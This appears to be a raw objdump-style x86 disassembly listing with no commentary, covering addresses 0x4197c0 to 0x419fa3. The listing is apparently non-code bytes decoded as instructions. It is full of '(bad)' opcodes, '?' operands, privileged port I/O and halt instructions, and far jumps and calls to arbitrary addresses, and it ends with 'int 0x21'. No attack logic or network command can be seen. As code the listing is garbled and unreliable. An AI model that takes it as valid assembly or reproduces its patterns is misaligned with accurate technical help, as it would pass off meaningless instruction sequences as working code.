  4197c0:	fsub   DWORD PTR [esi+edi*1-0xd]
  4197c4:	push   ebx
  4197c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197c6:	jmp    0x4197f2
  4197c8:	mov    DWORD PTR gs:[ecx],ebp
  4197cb:	xchg   ebx,eax
  4197cc:	push   ds
  4197cd:	imul   ebp,ecx,0x32bd5a07
  4197d3:	or     eax,0xe37d89bd
  4197d8:	fistp  DWORD PTR [edi+0x2dfc603]
  4197de:	outs   dx,BYTE PTR ds:[esi]
  4197df:	imul   edi,DWORD PTR [eax+edi*2],0x15
  4197e3:	rol    DWORD PTR [eax+0x39],0x55
  4197e7:	jae    0x4197ac
  4197e9:	push   0x5a
  4197eb:	sub    BYTE PTR [edi+ebx*4],ch
  4197ee:	adc    al,0x1c
  4197f0:	loope  0x41978e
  4197f2:	jnp    0x4197b6
  4197f4:	or     al,0x3
  4197f6:	jno    0x419855
  4197f8:	xchg   ecx,eax
  4197f9:	sbb    al,0xf6
  4197fb:	push   0xffffffe6
  4197fd:	mov    bl,0x15
  4197ff:	inc    esi
  419800:	addr16 test al,0x6b
  419803:	mov    ah,0xc8
  419805:	cmp    eax,0xe924ec47
  41980a:	arpl   WORD PTR [eax+ebp*2],dx
  41980d:	sub    al,0x14
  41980f:	mov    DWORD PTR [edi-0x1a],ecx
  419812:	cld    
  419813:	push   ebp
  419814:	cmp    BYTE PTR gs:[ebx+0x12],ch
  419818:	jbe    0x4197bc
  41981a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41981b:	(bad)  
  41981c:	dec    esi
  41981d:	pop    esi
  41981e:	jb     0x4197d4
  419820:	sbb    ch,BYTE PTR [ecx-0x14be3a8b]
  419826:	(bad)  
  419828:	or     BYTE PTR [ecx+0x6ceb31db],ch
  41982e:	ds out dx,eax
  419830:	shl    BYTE PTR [ebx+0x73],0xaa
  419834:	add    eax,0x4464bd6f
  419839:	push   esp
  41983a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41983b:	mov    bh,0x15
  41983d:	dec    esp
  41983e:	sub    eax,0x4edcbae9
  419843:	hlt    
  419844:	or     BYTE PTR [ebx-0x26e8427a],cl
  41984a:	mov    dh,0x2c
  41984c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41984d:	and    bh,BYTE PTR [esi-0x43d35a5a]
  419853:	out    dx,al
  419854:	inc    ecx
  419855:	adc    eax,0xf922f838
  41985a:	mov    bl,0xe2
  41985c:	or     cl,BYTE PTR [esi]
  41985e:	inc    eax
  41985f:	jp     0x41986f
  419861:	lahf   
  419862:	stos   DWORD PTR es:[edi],eax
  419863:	sbb    esi,edi
  419865:	push   edx
  419866:	push   ss
  419867:	push   edx
  419868:	ffree  st(0)
  41986a:	inc    esi
  41986b:	inc    esi
  41986c:	pop    edx
  41986d:	sub    eax,0xc6fee679
  419872:	mov    eax,0xbb99d490
  419877:	xchg   edx,eax
  419878:	lods   al,BYTE PTR ds:[esi]
  419879:	retf   
  41987a:	push   eax
  41987b:	lock fwait
  41987d:	mov    WORD PTR [edi],?
  41987f:	jmp    DWORD PTR [ebp+0x2f]
  419882:	mov    edx,0xf059b754
  419887:	addr16 in eax,0x30
  41988a:	xor    al,0xf3
  41988c:	push   cs
  41988d:	ds data16 sbb al,0x24
  419891:	fst    DWORD PTR [esi+0x6c6d2ae1]
  419897:	inc    esi
  419898:	mov    edx,0xafffcba1
  41989d:	mov    ecx,0x7bf4c993
  4198a2:	sbb    BYTE PTR [esi],al
  4198a4:	add    bh,BYTE PTR [ebx-0x1e8e5cc4]
  4198aa:	pop    ebx
  4198ab:	mov    al,0xd4
  4198ad:	mov    ds:0x8345fa77,eax
  4198b2:	dec    edi
  4198b3:	mov    eax,0xd4c8e5bf
  4198b8:	out    0x1a,eax
  4198ba:	xor    al,0x3b
  4198bc:	and    dh,BYTE PTR [eax+0x29]
  4198bf:	hlt    
  4198c0:	ins    DWORD PTR es:[edi],dx
  4198c1:	jle    0x419851
  4198c3:	ffree  st(7)
  4198c5:	mov    al,ds:0x59d020eb
  4198ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198cb:	cmp    esp,DWORD PTR [edi]
  4198cd:	leave  
  4198ce:	bound  ebx,QWORD PTR [eax+eax*4+0x2377a74a]
  4198d5:	sbb    ebp,DWORD PTR [ebp-0xd]
  4198d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d9:	ss add al,0xf3
  4198dc:	cmp    DWORD PTR ss:[ecx+0x5],0xa4041923
  4198e4:	cmc    
  4198e5:	scas   al,BYTE PTR es:[edi]
  4198e6:	mov    ds:0xf410b47,eax
  4198eb:	or     esi,DWORD PTR [eax]
  4198ed:	push   ecx
  4198ee:	xchg   ebp,eax
  4198ef:	xchg   edi,eax
  4198f0:	cli    
  4198f1:	lds    edx,FWORD PTR [ecx+0x44]
  4198f4:	and    ebx,DWORD PTR ds:0xbeb226e8
  4198fa:	mov    bh,0xb4
  4198fc:	jmp    0x75c5265f
  419901:	adc    dl,BYTE PTR ds:0x9cd7f6f1
  419907:	in     eax,0x1d
  419909:	fnstenv [ebp+0x9beddee]
  41990f:	scas   al,BYTE PTR es:[edi]
  419910:	mov    ch,0xa8
  419912:	imul   esp,DWORD PTR [ebx-0x471312fd],0x4c
  419919:	inc    edx
  41991a:	mov    edi,0xb25e2a96
  41991f:	les    ebp,FWORD PTR [edi-0x7859b78c]
  419925:	push   ecx
  419926:	dec    eax
  419927:	sbb    eax,0xe2179a57
  41992c:	adc    al,0x6f
  41992e:	xlat   BYTE PTR ds:[ebx]
  41992f:	fcom   DWORD PTR [ecx-0x2a03cb90]
  419935:	cli    
  419936:	adc    DWORD PTR [esi],0x5cb8f9a1
  41993c:	(bad)  
  41993d:	mov    ds:0x6a22760b,eax
  419942:	sbb    al,BYTE PTR [esi]
  419944:	mov    WORD PTR [ebp-0x62],cs
  419947:	mov    al,0x1b
  419949:	jns    0x419908
  41994b:	push   ebx
  41994c:	xor    al,0x60
  41994e:	fs push esi
  419950:	enter  0x7b99,0xe9
  419954:	and    cl,BYTE PTR ds:0x255763bd
  41995a:	jge    0x419940
  41995c:	loop   0x4198f0
  41995e:	loopne 0x4198f4
  419960:	es cdq 
  419962:	inc    edi
  419963:	jl     0x419946
  419965:	mov    ds:0xa28ee1eb,eax
  41996a:	sub    BYTE PTR [ebx+ecx*8+0x24],0xaa
  41996f:	cs gs mov ebp,0x8433dab3
  419976:	dec    esp
  419977:	push   es
  419978:	cmp    al,0xc9
  41997a:	popa   
  41997b:	jmp    0x2b85:0x94b98f66
  419982:	test   DWORD PTR [eax],eax
  419984:	add    DWORD PTR [edx-0x23122ae6],ecx
  41998a:	push   edx
  41998b:	out    dx,eax
  41998c:	push   ds
  41998d:	or     al,0xea
  41998f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419990:	imul   ebx,ecx,0xff15913b
  419996:	or     DWORD PTR [ecx],ecx
  419998:	inc    ecx
  419999:	aaa    
  41999a:	int    0xee
  41999c:	sbb    eax,0x91888159
  4199a1:	jmp    FWORD PTR [edi+0x22b9476c]
  4199a7:	mov    edx,0xe552afc5
  4199ac:	ss dec ebp
  4199ae:	dec    eax
  4199af:	mov    ds:0x287c591f,al
  4199b4:	fcom   QWORD PTR [edi-0x7]
  4199b7:	mov    esi,0x4e2bd460
  4199bc:	push   esi
  4199bd:	mov    ebp,0xc5a0bdc8
  4199c2:	dec    esp
  4199c3:	fcom   QWORD PTR [ebx+0x19]
  4199c6:	arpl   WORD PTR [eax+0x2f89b8e7],di
  4199cc:	and    al,0x49
  4199ce:	sbb    ebx,DWORD PTR [edi-0x2e]
  4199d1:	mov    eax,ds:0xf436b45b
  4199d6:	mov    dl,0x82
  4199d8:	js     0x419a3b
  4199da:	ds retf 
  4199dc:	pop    ds
  4199dd:	push   esp
  4199de:	mov    edi,0xd512154
  4199e3:	push   ebp
  4199e4:	(bad)  
  4199e5:	scas   eax,DWORD PTR es:[edi]
  4199e6:	mov    esi,DWORD PTR [eax+0x34]
  4199e9:	mov    edx,0x5e1ec1da
  4199ee:	call   0x18d5:0x51f9233d
  4199f5:	and    BYTE PTR [edi+0x5d],ah
  4199f8:	or     ebx,DWORD PTR [esi-0x25f49c5]
  4199fe:	jl     0x4199ef
  419a00:	cmp    ch,ch
  419a02:	stos   BYTE PTR es:[edi],al
  419a03:	push   cs
  419a04:	icebp  
  419a05:	sbb    eax,0x27a0b4be
  419a0a:	in     eax,dx
  419a0b:	outs   dx,DWORD PTR ds:[esi]
  419a0c:	inc    ebp
  419a0d:	sbb    BYTE PTR [edx-0x13],dh
  419a10:	es push ss
  419a12:	or     BYTE PTR ss:[edi+0x77],dl
  419a16:	(bad)
  419a19:	xor    esp,esp
  419a1b:	repnz add eax,0xcde2f16a
  419a21:	or     eax,0x841c820a
  419a26:	jecxz  0x419a49
  419a28:	sbb    ah,BYTE PTR [ebx-0x79171f5]
  419a2e:	jnp    0x419a69
  419a30:	jmp    0x4199e7
  419a32:	rcl    eax,1
  419a34:	pop    ecx
  419a35:	sbb    BYTE PTR [ebx-0x26d1780c],bh
  419a3b:	or     cl,dl
  419a3d:	aaa    
  419a3e:	test   eax,0x2bd04def
  419a43:	jno    0x419ac4
  419a45:	rcr    DWORD PTR ds:0xcf3716a7,cl
  419a4b:	stos   BYTE PTR es:[edi],al
  419a4c:	ret    0x3960
  419a4f:	aas    
  419a50:	out    dx,eax
  419a51:	or     esi,0xfffffff4
  419a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a56:	in     al,0x2b
  419a58:	icebp  
  419a59:	jl     0x419a17
  419a5b:	retf   0x5b0d
  419a5e:	pop    edi
  419a5f:	push   edx
  419a60:	es jmp 0xa171:0xeb79d0b5
  419a68:	and    BYTE PTR [ecx+0x725c12c],bh
  419a6e:	sbb    al,0x6a
  419a70:	add    eax,0xdaf4c4ba
  419a75:	sbb    edx,DWORD PTR [ecx+0x6171627a]
  419a7b:	call   0x74fe71e9
  419a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a81:	sub    al,0xd5
  419a83:	lds    edx,FWORD PTR [edi+0x5a]
  419a86:	xchg   edi,eax
  419a87:	mov    cl,0x53
  419a89:	icebp  
  419a8a:	or     ebx,DWORD PTR [edi+0x3]
  419a8d:	mov    al,ds:0xb955bf33
  419a92:	fcom   DWORD PTR [ecx-0x4a]
  419a95:	cmp    al,0xb5
  419a97:	add    al,0x6d
  419a99:	mov    ch,0x25
  419a9b:	aam    0xf5
  419a9d:	mov    ecx,0x909ff496
  419aa2:	repnz mov esp,0x108b391e
  419aa8:	add    bh,ah
  419aaa:	mov    edi,0x5b9da7df
  419aaf:	rcr    esp,0xdb
  419ab2:	push   cs
  419ab3:	sub    ah,BYTE PTR [esi+0x715be567]
  419ab9:	call   0x71af5fc7
  419abe:	addr16 ret 
  419ac0:	jne    0x419a4c
  419ac2:	mov    ecx,0x33b054c
  419ac7:	jmp    0x6a08:0x9bcb8173
  419ace:	cmp    BYTE PTR [ebx+0x7c],al
  419ad1:	mov    ds:0x481dccd,eax
  419ad6:	jb     0x419aad
  419ad8:	pop    ss
  419ad9:	pop    ds
  419ada:	or     al,0xd2
  419adc:	ins    DWORD PTR es:[edi],dx
  419add:	and    ebp,DWORD PTR [edx]
  419adf:	lock sbb cl,BYTE PTR es:[ebp-0x520b6682]
  419ae7:	sbb    DWORD PTR [ebx+0x4194c26d],ebx
  419aed:	push   0x291f1c69
  419af2:	in     eax,0xa8
  419af4:	mov    eax,0x6473b660
  419af9:	mov    ebp,0x7fc6163a
  419afe:	inc    ebx
  419aff:	(bad)  
  419b00:	pop    ds
  419b01:	out    0x1e,eax
  419b03:	in     eax,0xb
  419b05:	mov    ah,0xe7
  419b07:	add    ebp,0xffffffd4
  419b0a:	mov    ebp,0x87c61d74
  419b0f:	fs push ebp
  419b11:	inc    ebx
  419b12:	icebp  
  419b13:	repz out dx,eax
  419b15:	jge    0x419ab9
  419b17:	pop    ss
  419b18:	pop    edx
  419b19:	sub    DWORD PTR [ebx+0x17],edi
  419b1c:	lds    ecx,FWORD PTR [edi+0x2178c624]
  419b22:	jmp    0x5dcec873
  419b27:	(bad)  
  419b28:	cmp    BYTE PTR [esi+0x356c612f],dh
  419b2e:	js     0x419ad5
  419b30:	xchg   ebx,eax
  419b31:	mov    dh,0xa8
  419b33:	sub    al,0x26
  419b35:	and    BYTE PTR [esp+esi*2-0x6dc9375b],bh
  419b3c:	push   ebp
  419b3d:	out    dx,eax
  419b3e:	cli    
  419b3f:	in     al,0xbe
  419b41:	fild   WORD PTR [edx+0x32]
  419b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b45:	jns    0x419b3f
  419b47:	cmp    eax,0x2b7ba583
  419b4c:	(bad)  
  419b4d:	out    dx,al
  419b4e:	in     al,dx
  419b4f:	mov    cl,0x5
  419b51:	jns    0x419b5b
  419b53:	jmp    0x7ba3b559
  419b58:	jnp    0x9cd8817c
  419b5e:	or     ebp,DWORD PTR [edx-0x52]
  419b61:	data16 ins BYTE PTR es:[edi],dx
  419b63:	ins    BYTE PTR es:[edi],dx
  419b64:	pop    ecx
  419b65:	mov    eax,ds:0x144976cb
  419b6a:	and    al,0xe
  419b6c:	sub    ebx,DWORD PTR [edx+edi*8-0x4c39f86c]
  419b73:	and    al,0xef
  419b75:	bound  ecx,QWORD PTR [edi+ebx*1-0xa]
  419b79:	sbb    BYTE PTR [edx+0x401d24e1],dh
  419b7f:	lds    ebp,FWORD PTR [eax-0x20eb00e9]
  419b85:	mov    esi,0x99fbd4be
  419b8a:	sbb    ch,BYTE PTR [esp+edx*8-0x5b]
  419b8e:	jmp    0x419bb8
  419b90:	in     eax,dx
  419b91:	sub    ch,dl
  419b93:	add    al,0x29
  419b95:	imul   esp,DWORD PTR [eax-0x28],0x25
  419b99:	into   
  419b9a:	mov    esi,0xef3a0b4d
  419b9f:	fbld   TBYTE PTR [ecx+0x19b868a]
  419ba5:	test   BYTE PTR [edi-0x1a],0x8e
  419ba9:	cvttps2pi mm0,QWORD PTR [esi]
  419bac:	das    
  419bad:	and    BYTE PTR [esi],bh
  419baf:	(bad)  
  419bb0:	sbb    BYTE PTR [ebp+0x6d0bc814],al
  419bb6:	push   ds
  419bb7:	xor    BYTE PTR [esi-0x4cb4684],0x8b
  419bbe:	ins    BYTE PTR es:[edi],dx
  419bbf:	mov    eax,0x3c9eaf76
  419bc4:	es dec eax
  419bc6:	inc    edi
  419bc7:	add    dh,al
  419bc9:	mov    eax,0xd4366cbd
  419bce:	mov    esp,0x4d493477
  419bd3:	lahf   
  419bd4:	imul   DWORD PTR [eax+0x38]
  419bd7:	inc    eax
  419bd8:	push   ds
  419bd9:	imul   esi,DWORD PTR [edx+0x28],0x93405f07
  419be0:	push   0x45f91b9f
  419be5:	mov    BYTE PTR [esi-0x4f],bh
  419be8:	jo     0x419c22
  419bea:	sub    BYTE PTR [esi-0x7],0x9b
  419bee:	rol    edx,1
  419bf0:	pop    ds
  419bf1:	dec    ecx
  419bf2:	stos   DWORD PTR es:[edi],eax
  419bf3:	lea    edx,[ecx+0x6b0cb6c]
  419bf9:	aad    0x5b
  419bfb:	loopne 0x419c22
  419bfd:	sbb    ecx,edx
  419bff:	(bad)
  419c02:	cwde   
  419c03:	test   eax,0x4c056ccb
  419c08:	std    
  419c09:	jae    0x419b8b
  419c0b:	repnz sti 
  419c0d:	xchg   edx,eax
  419c0e:	in     eax,dx
  419c0f:	or     BYTE PTR [ebx+ebx*4+0x5b67132b],dl
  419c16:	in     al,0x9e
  419c18:	push   cs
  419c19:	sub    eax,0x992b0ac5
  419c1e:	cmp    ebp,DWORD PTR [edx-0x2f]
  419c21:	xchg   ebx,eax
  419c22:	loope  0x419bbf
  419c24:	jae    0x419bd3
  419c26:	retf   
  419c27:	dec    ebp
  419c28:	fild   WORD PTR [edx-0xb]
  419c2b:	dec    ecx
  419c2c:	shl    DWORD PTR [ebx],0xab
  419c2f:	in     al,0xf4
  419c31:	clc    
  419c32:	sub    al,0x2f
  419c34:	jmp    0x419c98
  419c36:	mov    esi,0xc6ffaa79
  419c3b:	in     al,0xcc
  419c3d:	hlt    
  419c3e:	arpl   WORD PTR [ebx-0x29],dx
  419c41:	cdq    
  419c42:	sti    
  419c43:	mov    eax,ds:0x1708588e
  419c48:	in     al,0xc3
  419c4a:	sbb    al,dh
  419c4c:	xor    DWORD PTR [ebx],edx
  419c4e:	mov    al,0x84
  419c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c51:	bound  esp,QWORD PTR [eax-0x4cd979d1]
  419c57:	pop    ecx
  419c58:	mov    al,ds:0xd62202a7
  419c5d:	adc    eax,0x17bd6087
  419c62:	sahf   
  419c63:	push   ebp
  419c64:	test   DWORD PTR [edx+0x6a],esp
  419c67:	hlt    
  419c68:	ret    0x59c6
  419c6b:	jnp    0x419c9a
  419c6d:	mov    BYTE PTR [esi+0xc9114c4],cl
  419c73:	cmp    DWORD PTR [ebx],esi
  419c75:	push   ecx
  419c76:	pop    edi
  419c77:	jecxz  0x419c1e
  419c79:	loope  0x419c25
  419c7b:	scas   al,BYTE PTR es:[edi]
  419c7c:	and    al,0x19
  419c7e:	clc    
  419c7f:	sbb    eax,0x270d58d3
  419c84:	add    ebx,DWORD PTR [edx]
  419c86:	cli    
  419c87:	add    bh,BYTE PTR [ecx+0x179c10e9]
  419c8d:	and    ah,bh
  419c8f:	dec    esp
  419c90:	and    eax,DWORD PTR [edi]
  419c92:	or     ecx,DWORD PTR [eax+0x66e7698a]
  419c98:	imul   ebx,ecx,0xc70f6d30
  419c9e:	lds    edi,FWORD PTR [eax]
  419ca0:	fistp  WORD PTR [edi-0x6ffb8bc5]
  419ca6:	or     al,0x74
  419ca8:	popa   
  419ca9:	fs cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419cac:	(bad)  
  419cad:	fidiv  WORD PTR [ecx-0x2f6dee1c]
  419cb3:	pop    eax
  419cb4:	in     eax,0xbc
  419cb6:	call   0x2117:0xc84c82ea
  419cbd:	pop    ecx
  419cbe:	cmp    al,0x45
  419cc0:	stos   BYTE PTR es:[edi],al
  419cc1:	shl    dl,0x5d
  419cc4:	jecxz  0x419c64
  419cc6:	dec    ebx
  419cc7:	push   esi
  419cc8:	add    edx,DWORD PTR [edi]
  419cca:	in     al,0x32
  419ccc:	aad    0x9b
  419cce:	add    BYTE PTR [edx],0xf8
  419cd1:	sar    BYTE PTR [ecx-0x553da00c],0x8a
  419cd8:	(bad)  
  419cd9:	jno    0x419c6a
  419cdb:	(bad)  
  419cdc:	sbb    BYTE PTR [ecx],cl
  419cde:	sti    
  419cdf:	dec    esi
  419ce0:	lods   eax,DWORD PTR ds:[esi]
  419ce1:	stos   BYTE PTR es:[edi],al
  419ce2:	inc    eax
  419ce3:	pushf  
  419ce4:	mov    ch,0x49
  419ce6:	loop   0x419c9d
  419ce8:	loop   0x419d1e
  419cea:	mov    dl,0xc4
  419cec:	xor    ah,BYTE PTR [edi-0x7c4c5065]
  419cf2:	jge    0x419d5c
  419cf4:	add    DWORD PTR ss:0x7539dfc5,0x51f5317
  419cff:	add    eax,0x4efe5d5
  419d04:	lock inc ebp
  419d06:	and    dh,dl
  419d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d09:	imul   esp,DWORD PTR [ecx],0xffffffe6
  419d0c:	push   edx
  419d0d:	sahf   
  419d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d0f:	pop    ss
  419d10:	sbb    DWORD PTR [ecx],ebp
  419d12:	fisttp QWORD PTR [eax+0x29]
  419d15:	push   edx
  419d16:	stc    
  419d17:	aad    0x94
  419d19:	mov    ?,WORD PTR [edi]
  419d1b:	pushf  
  419d1c:	inc    esi
  419d1d:	push   ecx
  419d1e:	into   
  419d1f:	jle    0x419ce3
  419d21:	inc    ebp
  419d22:	jne    0x419cf8
  419d24:	les    edi,FWORD PTR [ecx+esi*1-0x1d]
  419d28:	sub    BYTE PTR [ebp+0x925e772],ah
  419d2e:	sti    
  419d2f:	push   ss
  419d30:	push   esp
  419d31:	mov    cl,0xa8
  419d33:	mov    BYTE PTR [edi],dl
  419d35:	and    DWORD PTR [ebx+edi*4-0x67],ebp
  419d39:	push   esi
  419d3a:	shr    ebp,1
  419d3c:	inc    esp
  419d3d:	arpl   WORD PTR [eax-0xa],di
  419d40:	arpl   WORD PTR [ebp-0x44],ax
  419d43:	test   BYTE PTR [ebx],ch
  419d45:	sbb    al,ch
  419d47:	push   0x57
  419d49:	jmp    0x419dbd
  419d4b:	int3   
  419d4c:	add    cl,ch
  419d4e:	pop    esp
  419d4f:	pop    ds
  419d50:	push   ss
  419d51:	mov    eax,0xc8bea4fe
  419d56:	adc    al,0x33
  419d58:	fidivr DWORD PTR fs:[edi+0x6edd4d04]
  419d5f:	sbb    al,0xd5
  419d61:	push   cs
  419d62:	or     al,0xe6
  419d64:	or     dl,BYTE PTR [eax-0x45]
  419d67:	jg     0x419d8e
  419d69:	dec    ecx
  419d6a:	fsubr  DWORD PTR [edx+0x74]
  419d6d:	mov    ah,0x43
  419d6f:	cmc    
  419d70:	out    dx,eax
  419d71:	mov    ds:0x2c5c568b,al
  419d76:	lea    ebx,[ecx]
  419d78:	push   0x59c6b9cd
  419d7d:	cmp    edi,DWORD PTR [ecx+0x1d05ad44]
  419d83:	mov    al,0x86
  419d85:	sub    DWORD PTR [eax+0x4],0x8e525225
  419d8c:	jne    0x419d17
  419d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d8f:	imul   edi,DWORD PTR [ebx],0xf9835d50
  419d95:	adc    DWORD PTR [ecx+0x3dbec674],esi
  419d9b:	test   DWORD PTR [ebp-0x3b0c88fe],eax
  419da1:	pop    esi
  419da2:	mov    ds:0x5c292376,eax
  419da7:	loope  0x419d82
  419da9:	cmp    ah,BYTE PTR [esp+edi*2-0x7f]
  419dad:	mov    eax,ds:0x854f7cab
  419db2:	inc    ebp
  419db3:	mov    ebp,0xfc3fbdf8
  419db8:	sbb    BYTE PTR [ecx-0xe5f6b67],cl
  419dbe:	sbb    edx,ecx
  419dc0:	shl    BYTE PTR [ecx-0x6191943a],0x6b
  419dc7:	icebp  
  419dc8:	inc    eax
  419dc9:	sub    BYTE PTR [ebp+0x3cf8b1be],cl
  419dcf:	enter  0xd944,0xb1
  419dd3:	in     al,0xc9
  419dd5:	js     0x419e51
  419dd7:	cld    
  419dd8:	adc    eax,0xabe7a63a
  419ddd:	adc    DWORD PTR [ecx],0x99f92a2c
  419de3:	in     eax,dx
  419de4:	dec    esi
  419de5:	in     al,0x2c
  419de7:	pop    esi
  419de8:	loopne 0x419dc1
  419dea:	sub    al,0x42
  419dec:	xor    eax,0xe3e97f05
  419df1:	pop    ebx
  419df2:	mov    ebx,0x3f292110
  419df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419df8:	push   0xea7d7078
  419dfd:	mov    al,ds:0x85c59ffb
  419e02:	test   DWORD PTR [eax+0x5427bb08],ecx
  419e08:	push   0x57
  419e0a:	and    DWORD PTR [esi-0x4b197792],eax
  419e10:	pop    esi
  419e11:	addr16 shr edi,0x99
  419e15:	add    eax,0xa276d1c6
  419e1a:	jnp    0x419e2b
  419e1c:	into   
  419e1d:	inc    edx
  419e1e:	dec    DWORD PTR [edx+eiz*1-0x37]
  419e22:	pop    esi
  419e23:	pop    esp
  419e24:	inc    esp
  419e25:	fst    QWORD PTR [ecx+0x7b9eaca2]
  419e2b:	xchg   ecx,eax
  419e2c:	sub    eax,0x81e34b24
  419e31:	pop    ds
  419e32:	adc    eax,0x8d69195d
  419e37:	cld    
  419e38:	add    al,0xe9
  419e3a:	add    al,0xe1
  419e3c:	(bad)  
  419e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e3e:	retf   
  419e3f:	ficomp WORD PTR [esi]
  419e41:	push   cs
  419e42:	ins    DWORD PTR es:[edi],dx
  419e43:	mov    cl,0x70
  419e45:	fidivr WORD PTR [ebx]
  419e47:	jbe    0x419e12
  419e49:	into   
  419e4a:	scas   al,BYTE PTR es:[edi]
  419e4b:	in     eax,0xd5
  419e4d:	stc    
  419e4e:	mov    esp,0x7ba78cf0
  419e53:	(bad)  
  419e54:	jmp    0x6e03:0x9e2806e8
  419e5b:	xchg   esp,eax
  419e5c:	je     0x419e8d
  419e5e:	mov    edx,0x8c80acf4
  419e63:	or     al,0x65
  419e65:	cmp    DWORD PTR [ebx-0xd],esi
  419e68:	aad    0x53
  419e6a:	adc    BYTE PTR [edx+0x2c],bh
  419e6d:	dec    ecx
  419e6e:	or     eax,0xf82c60ef
  419e73:	cmc    
  419e74:	arpl   ax,cx
  419e76:	je     0x419e3d
  419e78:	xchg   ebp,eax
  419e79:	mov    edx,0x88d2e878
  419e7e:	popa   
  419e7f:	enter  0xa757,0xed
  419e83:	test   eax,0x2cad3922
  419e88:	push   esi
  419e89:	out    0xce,eax
  419e8b:	ror    BYTE PTR [esi+eiz*4-0x75],0x42
  419e90:	rol    DWORD PTR [ebp+0x7fd60867],1
  419e96:	push   ecx
  419e97:	sbb    ebp,DWORD PTR [esi]
  419e99:	popa   
  419e9a:	mov    ebx,DWORD PTR [eax-0x7ac62df]
  419ea0:	add    al,0x40
  419ea2:	test   esp,ebp
  419ea4:	mov    dh,0x9e
  419ea6:	sbb    edx,DWORD PTR [edi+0x4d]
  419ea9:	adc    ah,BYTE PTR [ebp+0x1]
  419eac:	add    DWORD PTR [eax-0x41fadda1],ecx
  419eb2:	mov    al,0xf4
  419eb4:	mov    BYTE PTR [ebp-0x1e781d19],al
  419eba:	jge    0x419e6b
  419ebc:	pop    esi
  419ebd:	je     0x419e79
  419ebf:	into   
  419ec0:	idiv   BYTE PTR [edx+edx*8-0x46abcf52]
  419ec7:	pop    esp
  419ec8:	push   ss
  419ec9:	sub    esi,eax
  419ecb:	les    esi,FWORD PTR [ebp+0x48]
  419ece:	pushf  
  419ecf:	mov    esp,0x69fc1577
  419ed4:	sub    BYTE PTR [eax+0x65],dl
  419ed7:	cld    
  419ed8:	leave  
  419ed9:	sub    ebp,DWORD PTR [ecx]
  419edb:	repnz in al,dx
  419edd:	stos   BYTE PTR es:[edi],al
  419ede:	stc    
  419edf:	retf   
  419ee0:	shl    DWORD PTR gs:[ecx],0xcd
  419ee4:	and    esi,DWORD PTR ds:0xa5a60563
  419eea:	sub    edi,DWORD PTR [ebx-0x71bd5f5a]
  419ef0:	or     al,BYTE PTR [esi-0x6]
  419ef3:	pop    ecx
  419ef4:	sbb    al,0xd9
  419ef6:	adc    dh,BYTE PTR [ebx]
  419ef8:	stos   BYTE PTR es:[edi],al
  419ef9:	in     eax,dx
  419efa:	or     BYTE PTR [esi+0x4b],ch
  419efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419efe:	mov    ebx,0x896dc95c
  419f03:	jbe    0x419edc
  419f05:	xchg   ebp,eax
  419f06:	ins    BYTE PTR es:[edi],dx
  419f07:	sub    al,0x45
  419f09:	push   ebp
  419f0a:	mov    edi,0x3ea3f354
  419f0f:	shr    bl,cl
  419f11:	lea    edi,[esi]
  419f13:	mov    al,0xcf
  419f15:	jns    0x419ecb
  419f17:	and    al,0x6
  419f19:	pop    edi
  419f1a:	mov    cl,0x8b
  419f1c:	adc    BYTE PTR [edi],0xb9
  419f1f:	in     al,0xc6
  419f21:	ins    BYTE PTR es:[edi],dx
  419f22:	dec    esp
  419f23:	hlt    
  419f24:	cmc    
  419f25:	mov    al,BYTE PTR [eax]
  419f27:	out    0x5b,eax
  419f29:	(bad)  [edi-0xb]
  419f2c:	push   ds
  419f2d:	sbb    DWORD PTR [edi+0x43e401c4],esp
  419f33:	xchg   esi,eax
  419f34:	sti    
  419f35:	jl     0x419f73
  419f37:	and    DWORD PTR [ecx-0x2e],ebp
  419f3a:	inc    edx
  419f3b:	icebp  
  419f3c:	mov    bl,0x59
  419f3e:	mov    ah,0x3c
  419f40:	xchg   edx,eax
  419f41:	pop    ecx
  419f42:	inc    edx
  419f43:	clc    
  419f44:	cld    
  419f45:	push   es
  419f46:	xchg   BYTE PTR [esi],bh
  419f48:	push   ds
  419f49:	mov    al,ds:0xd0c542b0
  419f4e:	jne    0x419f40
  419f50:	ds inc edi
  419f52:	fsub   DWORD PTR [ecx]
  419f54:	call   0x76edd4b5
  419f59:	loope  0x419f9e
  419f5b:	and    BYTE PTR [ebx],dh
  419f5d:	cdq    
  419f5e:	stc    
  419f5f:	sbb    eax,0xa99b9f46
  419f64:	imul   edx,DWORD PTR [ebp+ebp*8-0x15],0xffffffd4
  419f69:	out    0x40,eax
  419f6b:	jb     0x419faf
  419f6d:	jge    0x419f22
  419f6f:	(bad)  
  419f70:	push   cs
  419f71:	fwait
  419f72:	stos   DWORD PTR es:[edi],eax
  419f73:	fcmovnu st,st(4)
  419f75:	aam    0x10
  419f77:	out    0xda,al
  419f79:	arpl   cx,sp
  419f7b:	mov    cl,BYTE PTR [edi-0x47]
  419f7e:	mov    edx,0xd71de092
  419f83:	and    eax,0x69198b90
  419f88:	jne    0x419f4f
  419f8a:	add    ebp,esp
  419f8c:	jl     0x419ffe
  419f8e:	in     eax,dx
  419f8f:	fistp  WORD PTR [esi]
  419f91:	imul   ebx,DWORD PTR [edi*4+0xa8694c0],0x388ba19f
  419f9c:	cli    
  419f9d:	rcl    BYTE PTR es:[eax+eiz*8-0x62],0xb0
  419fa3:	int    0x21
